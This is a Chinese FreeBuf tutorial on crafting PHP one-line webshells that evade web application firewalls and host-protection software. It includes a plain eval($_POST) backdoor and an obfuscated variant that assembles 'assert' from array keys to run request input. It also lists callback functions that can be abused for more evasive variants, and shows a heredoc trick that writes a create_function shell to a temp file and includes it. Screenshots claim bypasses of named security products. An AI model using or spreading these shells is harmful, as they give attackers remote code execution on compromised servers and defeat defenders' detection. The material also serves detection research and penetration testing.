*****本文原创作者：crhua，本文属FreeBuf原创奖励计划，未经许可禁止转载**  
**

##  **前言**

 **在渗透测试时，我们向网站服务器写入一句话webshell时，往往会被某狗，某锁，某卫士拦截，导致我们拿不下shell。**

 **一句话webshell** **的工作原理：当前PHP脚本会去读取并执行变量中的内容。**

文章我介绍两种方法：

> 1.eval/assert花式变形
>
> 2.写入缓存，执行webshell  
>

## eval/assert 花式变形

    
    
    <?php  
      eval($_POST['crhua']);
    ?>  
    

这是最常见的一句话webshell,当然这是不免杀的，一些常见的waf 是基于特定规则查杀文件，当我们绕过这些规则就实现了所谓的免杀。

废话不多说只直接上免杀一句话

    
    
    <?php
    $fruits = array("a" => "lemon", "ss" => "orange", "ssr" => "banana", "t" => "apple");
    function test_alter(&$item1, $key, $prefix)
    {
     $item1 = "$prefix: $item1";
    }
    function test_print($item2, $key)
    {
     echo "$key. $item2<br />\n";
    }
    echo "Before ...:\n";
    array_walk($fruits, 'test_print');
    $a =array_keys($fruits);
    print_r($a);
    $m =$a[0].$a[1];
    $n ='er';
    $q = $m.$n.'t'; //assert
    $r = $_REQUEST['crhua'];
    @$q($r);
    //密码crhua
    ?>﻿
    

![201833223522dama.png](https://image.3001.net/images/20180303/15200877585949.png!small)  

![201833215815dama.png](https://image.3001.net/images/20180303/15200855245292.png!small)

当然这个webshell 也可以绕过某锁，首先我们先在网站目录下写入最简单的一句话webshell

    
    
    <?php
    eval($_POST['x'];
    ?>  
    

不用尝试就知道肯定会被拦截

![201833224241dama.png](https://image.3001.net/images/20180303/15200881839594.png!small)

但是这里一句话是免杀的

![201833225547dama.png](https://image.3001.net/images/20180303/15200889691362.png!small)  

下面是一些不常用的PHP函数，可以利用这些函数编写免杀一句话，函数用法自行百度。

    
    
    array_map()，array_rand(),array_splice
    unsort(),uasort(),uksort()
    array_map()
    array_filter()
    array_reduce()
    array_diff_uassoc(),array_diff_ukey()
    array_udiff(),array_udiff_assoc()
    array_udiff_uassoc()
    array_intersect_assoc(),array_intersect_uassoc()
    array_uintersect(),array_uintersect_assoc()
    array_uintersect_uassoc()
    array_walk(),array_walk_recursive()
    xml_set_character_data_handler()
    xml_set_default_handler()
    xml_set_external_entity_ref_handler()
    xml_set_notation_decl_handler()
    xml_set_processing_instruction_handler()
    xml_set_start_namespace_decl_handler()
    xml_set_unparsed_entity_decl_handler()
    set_error_handler()
    register_tick_function()
    uopz_function()  
    

## 写入缓存，执行webshell

这种方法用到两个函数

> tempnam() : 建立一个具有唯一文件名的文件
>
> sys_get_temp_dir() : 返回用于临时文件的目录

首先介绍一个概念： **定界符，** PHP定界符的作用是按照原样，包括换行格式什么的，输出在其内部的东西；

举个栗子：

    
    
    <?php
    $a = <<<h  
    "freebuf",fb
    h;   
    

![201833220022dama.png](https://image.3001.net/images/20180303/15200856461384.png!small)  

那么我们可以在定界符内写入php代码，利用前面提到的两个函数构造webshell。

代码如下:

    
    
    <?php
    error_reporting();
    $p = <<<h
    <?php
    \$crhua = $_POST['crhua'];
    function crhua($crhua){
      array_map(create_function("",\$crhua),array(1));
    }
    crhua(\$crhua);
    ?>
    h;
    
    $temp = tempnam(sys_get_temp_dir(),''); //获取缓存文件的路径
    fwrite(fopen($temp,'w'),$p),   //向缓存文件中写入内容
    include $temp;
    ?>  
    

![201833222101dama.png](https://image.3001.net/images/20180303/15200868948394.png!small)

这种方法同样也可以绕过某锁

![201833225151dama.png](https://image.3001.net/images/20180303/15200887397026.png!small)  

## 小小总结

文章提供了两种编写免杀一句话的思路，当然还有更多编写免杀一句话的奇淫技巧。免杀就是在不断尝试的基础上玩转的，欢迎和大家一起探讨更多姿势。

***本文原创作者：crhua，本文属FreeBuf原创奖励计划，未经许可禁止转载**

